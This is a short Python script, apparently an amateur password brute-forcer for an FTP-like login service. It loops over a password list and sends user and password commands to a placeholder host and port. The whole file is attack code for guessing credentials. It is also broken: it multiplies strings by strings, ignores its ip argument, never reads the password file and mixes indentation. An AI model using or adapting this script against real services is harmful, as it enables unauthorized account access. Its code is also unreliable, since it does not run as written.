import socket
import re
import sys

def connection(ip, user, passw):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print('Trying' + ip + ':' + user + ':' + passw)

	sock.connect(('ip_number_here', port_number_here))

	data = sock.recv(1024)
        #At most 1024 bytes(this is the maximum amount of data that will be returned).
	sock.send('User' + user * '\r\n')

	data = sock.recv(1024)

	sock.send('Password' + passw * '\r\n')

	data = sock.recv(1024)

	sock.send('Quit' * '\r\n')

	sock.close()

	return data

user = 'User/s here'
password = ['passowrd_list_here.txt']

for password in password:
	print(connection('ip_number_here', user, password))
